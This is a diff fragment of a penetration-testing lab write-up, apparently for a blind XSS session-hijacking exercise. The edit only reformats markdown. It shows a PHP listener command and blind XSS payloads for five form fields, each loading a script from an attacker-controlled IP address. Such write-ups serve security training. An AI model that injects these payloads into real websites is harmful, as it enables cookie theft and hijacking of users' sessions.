@@ -41,19 +41,19 @@ sudo chmod 666 cookies.txt
 sudo php -S 0.0.0.0:80
 ```
 ### 2. Identify Vulnerable Field
-**Form**: http://10.129.31.89/hijacking/index.php
+**Form**: ` http://10.129.31.89/hijacking/index.php`
 
 **Fields Tested:**
 
-fullname: ```bash "><script src=http://10.10.14.179/fullname></script> ```
+fullname: ` "><script src=http://10.10.14.179/fullname></script> `
 
-username: "><script src=http://10.10.14.179/username></script>
+username: ` "><script src=http://10.10.14.179/username></script> `
 
-password: "><script src=http://10.10.14.179/password></script>
+password: ` "><script src=http://10.10.14.179/password></script> `
 
-email: "><script src=http://10.10.14.179/email></script>
+email: ` "><script src=http://10.10.14.179/email></script> `
 
-imgurl: "><script src=http://10.10.14.179/imgurl></script>
+imgurl: ` "><script src=http://10.10.14.179/imgurl></script> `
 
 **Process:**
 
